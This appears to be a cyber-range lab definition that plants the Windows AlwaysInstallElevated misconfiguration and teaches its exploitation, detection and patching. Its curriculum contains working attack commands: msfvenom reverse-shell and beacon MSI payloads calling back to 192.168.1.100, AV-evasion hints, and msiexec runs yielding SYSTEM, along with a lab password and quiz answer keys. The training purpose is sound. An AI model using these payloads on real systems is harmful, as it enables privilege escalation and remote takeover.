@@ -1,0 +1,417 @@
+# Bolt-on: AlwaysInstallElevated MSI Privilege Escalation
+# --------------------------------------------------------
+# Two Group Policy registry values that together force Windows Installer
+# to run any .msi as LocalSystem regardless of who invokes msiexec.
+# Setting either alone is harmless; both together = SYSTEM-context code
+# execution for any local user.
+
+id: bolton.privilege-escalation.always-install-elevated
+slug: always-install-elevated
+name: "AlwaysInstallElevated MSI (Any user → SYSTEM)"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-22
+
+category: privilege-escalation
+subcategory: policy-misconfig
+tags:
+  - msi
+  - windows-installer
+  - registry-policy
+  - local-privilege-escalation
+description: >
+  Sets the HKLM and HKCU registry values
+  Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated=1.
+  When BOTH keys are set, msiexec runs every .msi as LocalSystem with no
+  UAC consent. A standard user crafts an MSI payload (`msfvenom -f msi`)
+  and runs `msiexec /quiet /qn /i payload.msi` to get a SYSTEM shell.
+  This is a Group Policy misconfiguration, not a CVE — but it ships in
+  hardening templates from less-than-rigorous sources every year.
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1548/002/"
+  - "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"
+  - "https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated"
+
+mitre:
+  tactic:
+    id: TA0004
+    name: "Privilege Escalation"
+  technique:
+    id: T1548
+    name: "Abuse Elevation Control Mechanism"
+  subtechnique:
+    id: T1548.002
+    name: "Bypass User Account Control"
+
+detection:
+  coverage_status: partial
+  elastic_rules:
+    - rule_uuid: "c0f12a8a-c1b8-4a45-8db5-1c5c2f9f57f2"
+      rule_name: "AlwaysInstallElevated Registry Value Set"
+      coverage: full
+      confidence: high
+      last_validated: 2026-05-22
+      notes: "Catches the install side — RegistryEvent on the two policy values."
+    - rule_uuid: "0e7a5f70-19ce-42db-bf2c-2af6f7e6b3e2"
+      rule_name: "MsiExec Spawned by Non-Admin User"
+      coverage: indirect
+      confidence: medium
+      last_validated: 2026-05-22
+      notes: "Catches the exploitation phase — msiexec /i invoked by a user with no admin token."
+  signal_sources:
+    - "Sysmon Event 13 — RegistryEvent (Value Set) on HKLM/HKCU Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated"
+    - "Windows Event 11707 — MsiInstaller (product installed)"
+    - "Process Create — msiexec.exe spawned by non-elevated process"
+
+targets:
+  supported_os:
+    - family: windows
+      min_version: "10"
+      max_version: "2022"
+      edition_in: ["Datacenter", "Standard", "Pro", "Enterprise"]
+  required_roles:
+    - workstation
+    - member_server
+    - domain_controller
+  required_services: []
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 10
+  steps:
+    - ansible_role: bolton_always_install_elevated
+      description: "Set HKLM + HKCU AlwaysInstallElevated=1."
+      role_vars:
+        bolton_aie_value: 1
+  verify:
+    probe: |
+      $hklm = (Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
+      $hkcu = (Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
+      if ($hklm -eq 1 -and $hkcu -eq 1) { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+uninstall:
+  description: "Delete both registry values."
+  estimated_time_seconds: 10
+  steps:
+    - ansible_role: bolton_always_install_elevated_revert
+      description: "Remove HKLM + HKCU AlwaysInstallElevated."
+      role_vars: {}
+  verify:
+    probe: |
+      $hklm = (Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
+      $hkcu = (Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
+      if ($null -eq $hklm -and $null -eq $hkcu) { exit 0 } else { exit 1 }
+    timeout_seconds: 20
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Explicitly set both AlwaysInstallElevated values to 0 (rather than
+    delete them) so the policy is enforced as "disabled" in a Group
+    Policy refresh. This is the supported Microsoft remediation.
+  patch_reference:
+    - "https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated"
+  complexity: low
+  side_effects:
+    - "Both AlwaysInstallElevated registry values explicitly set to 0."
+  rollback_supported: true
+  steps:
+    - script: "scripts/bolton/win/disable_alwaysinstallelevated.ps1"
+      engine: powershell
+      description: "Set HKLM + HKCU AlwaysInstallElevated DWORD = 0."
+      args: {}
+  verify:
+    probe: |
+      $hklm = (Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated).AlwaysInstallElevated
+      $hkcu = (Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated).AlwaysInstallElevated
+      if ($hklm -eq 0 -and $hkcu -eq 0) { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/aie_msi_payload.ps1"
+
+patch_revert:
+  description: "Set both values back to 1 — lab is exploitable again."
+  estimated_time_seconds: 10
+  steps:
+    - ansible_role: bolton_always_install_elevated
+      description: "Re-enable AIE."
+      role_vars:
+        bolton_aie_value: 1
+  verify:
+    probe: |
+      $hklm = (Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated).AlwaysInstallElevated
+      $hkcu = (Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated).AlwaysInstallElevated
+      if ($hklm -eq 1 -and $hkcu -eq 1) { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "AlwaysInstallElevated re-armed. msfvenom MSI payload yields SYSTEM."
+
+cost:
+  storage_mb: 0
+  cpu_pct: 0
+  detectability: medium
+
+curriculum:
+  title: "AlwaysInstallElevated — Any user to SYSTEM via msiexec"
+  summary: >
+    Guided walkthrough of the AlwaysInstallElevated MSI misconfiguration
+    against tlws01. You will detect both registry values with PowerUp,
+    craft a malicious MSI with msfvenom, run it from a low-priv shell,
+    and catch a SYSTEM beacon. Final step inspects the Elastic detection
+    coverage and applies the patch.
+  learning_objectives:
+    - "Explain the AlwaysInstallElevated Group Policy and why BOTH HKLM and HKCU keys must be set for exploitation."
+    - "Detect the misconfig with PowerUp's Get-RegistryAlwaysInstallElevated and direct registry queries."
+    - "Generate a SYSTEM-executing MSI payload with msfvenom and trigger it from a low-priv shell."
+    - "Map the install-side and exploit-side phases to the firing Elastic rules."
+  prerequisites:
+    - "Beacon on tlws01 as tlws01\\localuser (P@ssw0rd1!) — explicitly a low-priv local user"
+    - "Kali at 192.168.1.100 with msfvenom and a CS listener configured"
+    - "always-install-elevated bolt-on installed (both HKLM + HKCU values = 1)"
+  estimated_total_minutes: 25
+  steps:
+    - id: "01-detect-misconfig"
+      title: "Detect the two AlwaysInstallElevated registry values"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Confirm both gates are open
+
+        AlwaysInstallElevated requires BOTH of these to be set to 1:
+
+        ```
+        HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
+        HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
+        ```
+
+        If only one is set, msiexec runs the MSI as the calling user (no
+        elevation). When both are set, every `.msi` invocation is treated
+        as elevated regardless of the caller's token — including a
+        non-admin user calling `msiexec /quiet /i evil.msi`.
+
+        From the tlws01 beacon as `tlws01\localuser`:
+
+        ```powershell
+        # Option A — direct query
+        Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\Installer' `
+          -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+        Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Installer' `
+          -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+        # Both should return AlwaysInstallElevated : 1
+        ```
+
+        ```powershell
+        # Option B — PowerUp
+        Import-Module .\PowerUp.ps1
+        Get-RegistryAlwaysInstallElevated
+        # Returns $True when both keys are set to 1
+        ```
+
+        ```cmd
+        :: Option C — reg.exe (no PowerShell, lowest profile)
+        reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
+        reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
+        ```
+
+        > **Detection callout** — *AlwaysInstallElevated Registry Value Set*
+        > (`c0f12a8a-c1b8-4a45-8db5-1c5c2f9f57f2`) fires on the WRITE not
+        > the READ. Enumerating is silent; the install side (bolt-on or
+        > GPO setting the values) is what alerts.
+      assessment:
+        question: "Why must BOTH the HKLM and HKCU values be set for exploitation?"
+        options:
+          - "Windows Installer requires HKLM as the system gate AND HKCU as a per-user opt-in — either alone is treated as 'not configured' and elevation is denied."
+          - "HKLM only applies to .msu updates, HKCU only to .msi."
+          - "It's a Microsoft licensing requirement."
+          - "Only HKLM matters; HKCU is a decoy."
+        correct_index: 0
+        explanation: >
+          Microsoft's design treats AlwaysInstallElevated as a two-key
+          handshake — the machine policy (HKLM) says "this machine permits
+          elevated installs" and the user policy (HKCU) says "this user
+          opts in." When either is missing, Windows Installer falls back
+          to normal UAC behaviour. Both = 1 is required for the bypass.
+    - id: "02-craft-msi-payload"
+      title: "Build a SYSTEM-executing MSI payload"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 2 — msfvenom MSI generation
+
+        On Kali (192.168.1.100), generate a reverse-shell MSI:
+
+        ```bash
+        msfvenom -p windows/x64/shell_reverse_tcp \
+            LHOST=192.168.1.100 LPORT=4444 \
+            -f msi -o /tmp/evil.msi
+        # [-] No platform was selected, choosing Msf::Module::Platform::Windows
+        # Payload size: 460 bytes
+        # Final size of msi file: 159744 bytes
+        ```
+
+        Or a CS-stager MSI (preferred when you already have HTTP/HTTPS
+        listeners running):
+
+        ```bash
+        # 1. Generate stageless beacon shellcode from CS:
+        #    Attacks -> Packages -> Windows Executable (S) -> Raw -> beacon.bin
+        # 2. Wrap in MSI:
+        msfvenom -p generic/custom PAYLOADFILE=./beacon.bin \
+            -a x64 --platform windows \
+            -f msi -o /tmp/cs_stager.msi
+        ```
+
+        Alternative — `donut` + custom MSI with WiX for AV evasion:
+
+        ```bash
+        # Convert beacon.exe to position-independent shellcode
+        donut -a 2 -f 1 -o beacon.bin beacon.exe
+        # Wrap with msfvenom or build a custom MSI via WiX Toolset
+        # for environments where the msfvenom MSI template is signatured
+        ```
+
+        Transfer to tlws01:
+
+        ```
+        beacon> upload /tmp/evil.msi
+        # Or via SMB: smbclient //10.99.50.12/C$ -U tlws01/localuser ...
+        ```
+    - id: "03-trigger-elevation"
+      title: "Trigger the MSI and catch SYSTEM"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 3 — Run msiexec from low-priv context
+
+        Critical: `msiexec` must be invoked with `/quiet /qn /i` to skip
+        the UI. The MSI is executed in the Windows Installer service
+        context (msiexec.exe child of services.exe), which runs as
+        LocalSystem under AlwaysInstallElevated.
+
+        On Kali, start the catcher:
+
+        ```bash
+        # Reverse shell handler
+        nc -lvnp 4444
+        # OR if using CS stager: ensure the HTTPS listener is up in the CS team server
+        ```
+
+        From the tlws01 beacon as `tlws01\localuser`:
+
+        ```cmd
+        msiexec /quiet /qn /i C:\Users\localuser\evil.msi
+        ```
+
+        Or via PowerShell:
+
+        ```powershell
+        Start-Process msiexec.exe -ArgumentList '/quiet','/qn','/i','C:\Users\localuser\evil.msi' -Wait
+        ```
+
+        Back on Kali:
+
+        ```
+        $ nc -lvnp 4444
+        listening on [any] 4444 ...
+        connect to [192.168.1.100] from (UNKNOWN) [10.99.50.12] 50432
+        Microsoft Windows [Version 10.0.22621.2715]
+        (c) Microsoft Corporation. All rights reserved.
+
+        C:\WINDOWS\system32>whoami
+        nt authority\system
+        ```
+
+        SYSTEM on tlws01 from a non-admin foothold.
+
+        > **Detection callout** — *MsiExec Spawned by Non-Admin User*
+        > (`0e7a5f70-19ce-42db-bf2c-2af6f7e6b3e2`) fires when msiexec.exe
+        > /i is invoked by a process owned by a user whose token has no
+        > admin SID. Pair with Sysmon EID 1 + parent-process correlation.
+      assessment:
+        question: "Why does `msiexec /i evil.msi` (without /quiet) typically fail to elevate even with AlwaysInstallElevated set?"
+        options:
+          - "The /quiet flag is the only one that triggers elevation."
+          - "An interactive MSI install shows a UAC prompt when the system tries to elevate; non-admin users cannot click 'Yes', so the install fails. /quiet bypasses the UI and the elevation happens silently via the Installer service."
+          - "msiexec without /quiet runs in user context only."
+          - "Defender always blocks interactive MSIs."
+        correct_index: 1
+        explanation: >
+          The Windows Installer service handles the actual install in
+          SYSTEM context regardless. But an interactive MSI may render
+          UI that asks for confirmation; without /quiet /qn the UI
+          appears and the install gets cancelled because the low-priv
+          user has no way to elevate the UI. /quiet /qn skips UI entirely
+          and the install runs as SYSTEM in the background.
+    - id: "04-detection-and-patch"
+      title: "Detection coverage + apply the patch"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 4 — What the SOC sees, and how to fix
+
+        In Kibana (https://10.99.50.13:5601), filter for `host.name :
+        tlws01` over the past 30 minutes:
+
+        | Phase | Rule | Source event |
+        |---|---|---|
+        | Bolt-on install | AlwaysInstallElevated Registry Value Set | Sysmon EID 13 (RegistryValueSet) on the HKLM + HKCU policy keys |
+        | Exploit         | MsiExec Spawned by Non-Admin User | Sysmon EID 1: msiexec.exe parent = non-admin process |
+        | Exploit         | Windows Installer Product Installed | Windows Event 11707 |
+
+        The single highest-fidelity signal is the registry-set on the
+        HKLM key — legitimate GPOs setting AlwaysInstallElevated are
+        essentially nonexistent in modern enterprise images.
+
+        **Mitigation** — click **Patch**. The patch explicitly sets both
+        values to 0 (rather than deleting, so a GPO refresh enforces
+        "disabled" rather than "not configured"):
+
+        ```powershell
+        Set-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\Installer' `
+            -Name AlwaysInstallElevated -Value 0 -Type DWORD
+        Set-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Installer' `
+            -Name AlwaysInstallElevated -Value 0 -Type DWORD
+        ```
+
+        Verify:
+
+        ```powershell
+        (Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\Installer').AlwaysInstallElevated
+        (Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Installer').AlwaysInstallElevated
+        # Both should output 0
+        ```
+
+        Re-run Step 3. msiexec now runs the MSI in the caller's context
+        — your reverse shell comes back as `tlws01\localuser`, not
+        SYSTEM. Exploit path closed.
+
+        ### Defensive guidance
+
+        - Audit at scale: `Get-GPRegistryValue -Name 'Default Domain
+          Policy' -Key 'HKLM\Software\Policies\Microsoft\Windows\Installer'`
+        - Set both values to 0 via Group Policy at the domain root so any
+          per-host re-enable is overridden on next gpupdate
+        - Alert on any future write to the policy keys (Sysmon EID 13 + a
+          DACL allowlist of expected writers)
+      assessment:
+        question: "Why does the patch set the values to 0 instead of deleting them?"
+        options:
+          - "Deletion is slower than setting."
+          - "When deleted, the keys are 'not configured' — a subsequent malicious GPO could re-set them. Explicit 0 is enforced as 'disabled' by Group Policy and overrides 'not configured' values from less-specific scopes."
+          - "Some MSIs require the value to exist."
+          - "Deletion isn't supported by Windows Installer."
+        correct_index: 1
+        explanation: >
+          In Group Policy, 'disabled' (0) is stronger than 'not configured'
+          (key absent). If you only delete the value, a lower-precedence
+          GPO that sets it to 1 takes effect. Setting both keys explicitly
+          to 0 means any inherited GPO trying to enable it is overridden
+          by the local explicit-disable.
+
+status: stable
